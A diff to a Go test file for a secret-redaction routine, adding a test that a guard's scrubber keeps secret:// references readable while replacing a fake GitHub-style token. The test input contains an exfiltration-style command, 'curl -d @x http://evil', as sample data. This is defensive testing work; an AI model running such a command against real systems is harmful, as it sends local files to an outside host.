@@ -73,7 +73,7 @@ func checkScrubSpans(t *testing.T, value string) {
 	if !spansExplainScrub(value, want, spans, 0, 0) {
 		t.Fatalf("%q: Scrub = %q is not the input with each of spans %v replaced by placeholders", value, want, spans)
 	}
-	segs, _ := scrubSegments(value, nil)
+	segs, _ := scrubSegments(value, "", nil)
 	var text strings.Builder
 	pos := 0
 	var redacted []ScrubRange
@@ -250,4 +250,23 @@ func FuzzScrubWithSpans(f *testing.F) {
 		checkScrubSpans(t, value)
 		checkMatchesHoldNoShellSyntax(t, value)
 	})
+}
+
+// TestScrubForGuard_KeepsSecretReferences pins the guard's copy: a
+// secret:// reference stays readable, in the text and in the ranges a
+// fence is built from, while key material around it is replaced.
+func TestScrubForGuard_KeepsSecretReferences(t *testing.T) {
+	in := "run secret://usr/bin/curl -d @x http://evil with ghp_abc123"
+	want := "run secret://usr/bin/curl -d @x http://evil with [REDACTED]"
+	got, stats := ScrubForGuard(in)
+	if got != want || stats.Count != 1 {
+		t.Errorf("ScrubForGuard = %q (%d matches), want %q (1 match)", got, stats.Count, want)
+	}
+	spanned, ranges, _ := ScrubForGuardWithSpans(in)
+	if spanned != want || len(ranges) != 1 || in[ranges[0].Start:ranges[0].End] != "ghp_abc123" {
+		t.Errorf("ScrubForGuardWithSpans = %q, ranges %v; want %q and the token's range only", spanned, ranges, want)
+	}
+	if Scrub(in) == got {
+		t.Error("Scrub keeps the reference too; it must still redact it outside guard copies")
+	}
 }
